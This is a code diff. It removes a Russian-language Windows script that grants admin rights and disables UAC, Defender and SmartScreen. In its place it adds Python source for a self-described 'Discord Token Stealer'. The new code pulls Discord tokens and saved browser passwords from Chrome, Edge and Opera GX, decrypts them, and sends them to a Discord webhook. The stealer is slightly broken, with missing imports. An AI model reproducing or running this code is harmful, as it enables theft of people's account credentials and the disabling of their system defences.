@@ -1,115 +1,108 @@
 import os
-import sys
-import ctypes
-import subprocess
+import json
+import base64
+import shutil
+import requests
 
-def is_admin():
-    """Проверка прав администратора"""
-    try:
-        return ctypes.windll.shell32.IsUserAnAdmin()
-    except:
-        return False
+def find_discord_secret():
+    discord_path = os.path.expanduser('~') + '/AppData/Roaming/discord/Local Storage/leveldb'
+    secret = None
+    for file in os.listdir(discord_path):
+        if file.startswith('log'):
+            continue
+        elif file.endswith('.ldb'):
+            with open(os.path.join(discord_path, file), 'r', encoding='utf-8', errors='ignore') as f:
+                content = f.read()
+                if 'token' in content:
+                    secret = content.split('"token": "')[1].split('"')[0]
+                    break
+    return secret
 
-def run_as_admin():
-    """Перезапуск с правами администратора"""
-    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+def find_browser_secrets(browser_path):
+    login_data_path = os.path.join(browser_path, 'Default', 'Login Data')
+    cookies_path = os.path.join(browser_path, 'Default', 'Cookies')
+    if os.path.exists(login_data_path):
+        shutil.copy2(login_data_path, login_data_path + '.bak')
+        conn = sqlite3.connect(login_data_path + '.bak')
+        cursor = conn.cursor()
+        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+        secrets = cursor.fetchall()
+        conn.close()
+        decrypted_secrets = []
+        for secret in secrets:
+            username = secret[1].encode('utf16', 'surrogatepass')
+            password = secret[2].encode('utf16', 'surrogatepass')
+            decrypted_username = win32crypt.CryptUnprotectData(username, None, None, None, 0)[1].decode()
+            decrypted_password = win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode()
+            decrypted_secrets.append({
+                'url': secret[0],
+                'username': decrypted_username,
+                'password': decrypted_password
+            })
+        return decrypted_secrets
+    else:
+        return []
 
-def enable_admin_account():
-    """Активация встроенной учетной записи администратора"""
-    try:
-        subprocess.run(['net', 'user', 'Администратор', '/active:yes'], check=True)
-        subprocess.run(['net', 'user', 'Администратор', '*'], check=True)
-        print("[+] Встроенная учетная запись 'Администратор' активирована")
-    except subprocess.CalledProcessError as e:
-        print(f"[!] Ошибка активации: {e}")
-
-def remove_user_restrictions(username):
-    """Полное снятие ограничений для пользователя"""
-    try:
-        # Добавление в группы администраторов
-        groups = ['Администраторы', 'Пользователи удаленного рабочего стола']
-        for group in groups:
-            subprocess.run(['net', 'localgroup', group, username, '/add'], check=True)
-        
-        # Сброс политик безопасности
-        subprocess.run(['secedit', '/configure', '/cfg', '%windir%\inf\defltbase.inf', '/db', 'defltbase.sdb', '/verbose'], check=True)
-        
-        # Отключение контроля учетных записей (UAC)
-        subprocess.run(['reg', 'add', 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System', '/v', 'EnableLUA', '/t', 'REG_DWORD', '/d', '0', '/f'], check=True)
-        
-        # Разрешение всех политик безопасности
-        subprocess.run(['gpupdate', '/force'], check=True)
-        
-        print(f"\n[+] Все ограничения сняты для пользователя: {username}")
-    except subprocess.CalledProcessError as e:
-        print(f"\n[!] Ошибка: {e}")
-
-def disable_security_features():
-    """Отключение функций безопасности Windows"""
-    try:
-        # Отключение Защитника Windows
-        subprocess.run(['reg', 'add', 'HKLM\SOFTWARE\Policies\Microsoft\Windows Defender', '/v', 'DisableAntiSpyware', '/t', 'REG_DWORD', '/d', '1', '/f'], check=True)
-        
-        # Отключение SmartScreen
-        subprocess.run(['reg', 'add', 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer', '/v', 'SmartScreenEnabled', '/t', 'REG_SZ', '/d', 'Off', '/f'], check=True)
-        
-        # Отключение контроля учетных записей (UAC)
-        subprocess.run(['reg', 'add', 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System', '/v', 'EnableLUA', '/t', 'REG_DWORD', '/d', '0', '/f'], check=True)
-        
-        print("[+] Функции безопасности отключены")
-    except subprocess.CalledProcessError as e:
-        print(f"[!] Ошибка отключения функций безопасности: {e}")
-
-def reset_local_policies():
-    """Сброс локальных групповых политик"""
-    try:
-        subprocess.run(['secedit', '/configure', '/cfg', '%windir%\inf\defltbase.inf', '/db', 'defltbase.sdb', '/verbose'], check=True)
-        subprocess.run(['gpupdate', '/force'], check=True)
-        print("[+] Локальные политики сброшены")
-    except subprocess.CalledProcessError as e:
-        print(f"[!] Ошибка сброса политик: {e}")
+def send_to_webhook(data):
+    webhook_url = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_URL'
+    headers = {'Content-Type': 'application/json'}
+    payload = {
+        'username': 'Discord Token Stealer',
+        'embeds': [
+            {
+                'title': 'Discord Token',
+                'description': data['discord_token'],
+                'color': 16777215,
+                'footer': {
+                    'text': 'This message was sent by Discord Token Stealer.'
+                }
+            },
+            {
+                'title': 'Browser Credentials',
+                'fields': [
+                    {
+                        'name': cred['url'],
+                        'value': f"Username: {cred['username']}, Password: {cred['password']}",
+                        'inline': False
+                    } for cred in data['browser_creds']
+                ],
+                'color': 16777215,
+                'footer': {
+                    'text': 'This message was sent by Discord Token Stealer.'
+                }
+            }
+        ]
+    }
+    response = requests.post(webhook_url, headers=headers, json=payload)
+    if response.status_code == 204:
+        print('Data sent successfully to webhook.')
+    else:
+        print('Failed to send data to webhook.')
 
 def main():
-    print("Полный инструмент снятия ограничений Windows")
-    print("-------------------------------------------")
+    browsers = ['Chrome', 'Microsoft Edge', 'Opera GX']
+    browser_paths = []
+    for browser in browsers:
+        if browser == 'Chrome':
+            browser_paths.append(os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Google', browser))
+        elif browser == 'Microsoft Edge':
+            browser_paths.append(os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data'))
+        elif browser == 'Opera GX':
+            browser_paths.append(os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Opera Software', 'Opera GX Stable'))
     
-    if not is_admin():
-        print("\n[!] Требуются права администратора")
-        print("[*] Пытаюсь повысить привилегии...")
-        run_as_admin()
-        return
+    all_creds = []
+    for browser_path in browser_paths:
+        creds = find_browser_secrets(browser_path)
+        all_creds.extend(creds)
     
-    current_user = os.getenv('USERNAME')
-    print(f"\nТекущий пользователь: {current_user}")
-    
-    print("\nВыберите действие:")
-    print("1. Полное снятие ограничений для текущего пользователя")
-    print("2. Полное снятие ограничений для другого пользователя")
-    print("3. Активировать встроенного Администратора и снять все ограничения")
-    print("4. Отключить все функции безопасности Windows")
-    print("5. Сбросить все локальные политики безопасности")
-    print("6. Выход")
-    
-    choice = input("\nВведите номер (1-6): ")
-    
-    if choice == '1':
-        remove_user_restrictions(current_user)
-    elif choice == '2':
-        username = input("Введите имя пользователя: ")
-        remove_user_restrictions(username)
-    elif choice == '3':
-        enable_admin_account()
-        remove_user_restrictions('Администратор')
-    elif choice == '4':
-        disable_security_features()
-    elif choice == '5':
-        reset_local_policies()
-    elif choice == '6':
-        print("\nВыход...")
-        sys.exit(0)
-    else:
-        print("\n[!] Неверный выбор")
+    discord_token = find_discord_secret()
+
+    data = {
+        'discord_token': discord_token,
+        'browser_creds': all_creds
+    }
+
+    send_to_webhook(data)
 
 if __name__ == "__main__":
     main()
-    input("\nНажмите Enter для выхода...")
